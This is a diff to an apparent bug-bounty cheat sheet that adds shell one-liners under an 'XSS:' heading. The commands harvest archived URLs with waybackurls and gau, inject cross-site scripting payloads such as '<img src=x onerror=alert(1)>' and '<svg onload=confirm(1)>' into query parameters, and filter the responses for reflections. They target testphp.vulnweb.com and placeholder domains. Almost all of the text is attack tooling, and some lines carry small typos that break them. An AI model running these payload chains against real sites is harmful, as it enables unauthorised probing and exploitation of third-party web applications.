@@ -97,6 +97,16 @@
 <br/><br/>
 ## XSS:
 
+`echo http://testphp.vulnweb.com | waybackurls | gf xss | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq | egrep -v 'Not'`
+
+`python3 $HOME/Tools/XSStrike-Reborn/xsstrike.py -u "https://xxxxx.com/xxxxx?q=" -d 2 -f /root/XSS-el`
+
+`waybackurls http://testphp.vulnweb.com | urldedupe -qs | bhedak '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)" | egrep -v 'Not'`
+
+`waybackurls http://testphp.vulnweb.com | urldedupe -qs | bhedak 'adriel' | airixss -payload "adriel" | egrep -v 'Not'`
+
+`docker run -it -v $PWD:/app x8 -u https://xxxxx.com -w /app/large.txt`
+
 `cat domains.txt | waybackurls | grep -Ev "\.(jpeg|jpg|png|ico)$" | uro | grep =  | qsreplace "<img src=x onerror=alert(1)>" | httpx -silent -nc -mc 200 -mr "<img src=x onerror=alert(1)>"`
 
 `gau target.com grep '='| qsreplace hack\" -a | while read url;do target-$(curl -s -l $url | egrep -o '(hack" | hack\\")'); echo -e "Target : \e[1;33m $url\e[om" "$target" "\n -"; done I sed 's/hack"/[xss Possible] Reflection Found/g'`
